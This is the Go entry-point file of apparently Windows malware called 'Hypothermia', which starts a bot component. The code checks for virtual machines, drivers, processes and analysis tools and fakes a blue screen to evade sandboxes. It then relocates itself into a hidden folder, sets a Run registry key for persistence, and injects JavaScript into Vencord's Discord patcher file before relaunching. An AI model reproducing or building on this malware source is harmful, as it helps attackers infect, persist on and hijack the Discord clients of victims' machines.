package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"Hypothermia/config"
	"Hypothermia/src/bot"
	"Hypothermia/src/funcs"
	"Hypothermia/src/utils"
	"Hypothermia/src/utils/persistence"
)

func main() {
	if config.AntiVM {
		code := 0

		if utils.CheckVMs() {
			code = 1
		}

		if utils.CheckDrivers() {
			code = 2
		}

		if utils.CheckProcesses() {
			code = 3
		}

		if utils.CheckVT() {
			code = 4

			funcs.BlueScreen()
			os.Exit(1)
			return
		}

		if code != 0 {
			funcs.BlueScreen()

			fmt.Println("AVC -", code)
			fmt.Scanln()
			return
		}
	}

	if len(os.Args) == 3 && os.Args[1] == config.Verifier {
		if os.Args[2] != "NIL" {
			if file, err := os.Create(os.Args[2]); err == nil {
				file.Close()
			}
		}

		bot.OnStartup()
		bot.Init()
		return
	}

	folder := utils.GetMainFolder()
	_, err := os.Stat(folder)
	if err != nil {
		if os.IsNotExist(err) {
			err = os.MkdirAll(folder, os.ModePerm)
			if err != nil {
				fmt.Println("main/1 -", err)
				fmt.Scanln()
				return
			}

			if !config.Debugging && config.HideFolder {
				err = utils.HideItem(folder)
				if err != nil {
					fmt.Println("main/2 -", err)
					fmt.Scanln()
					return
				}
			}
		}
	}

	oldPath, err := os.Executable()
	if err != nil {
		fmt.Println("main/3 -", err)
		fmt.Scanln()
		return
	}

	newPath := filepath.Join(folder, filepath.Base(oldPath))
	err = os.Rename(oldPath, newPath)
	if err != nil {
		fmt.Println("main/4 -", err)
		fmt.Scanln()
		return
	}

	if !config.Debugging && config.Persistence {
		err := utils.SetRegistryVal(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.HypothermiaName,
			fmt.Sprintf("\"%s\" %s %s", newPath, config.Verifier, "NIL"),
		)

		if err != nil {
			fmt.Println("main/5 -", err)
			fmt.Scanln()
			return
		}

		utils_persist.InjectJS(filepath.Join(os.Getenv("APPDATA"), "Vencord\\dist\\patcher.js"))
	}

	cmd := exec.Command(newPath, config.Verifier, oldPath)
	err = cmd.Start()
	if err != nil {
		fmt.Println("main/6 -", err)
		fmt.Scanln()
		return
	}
}
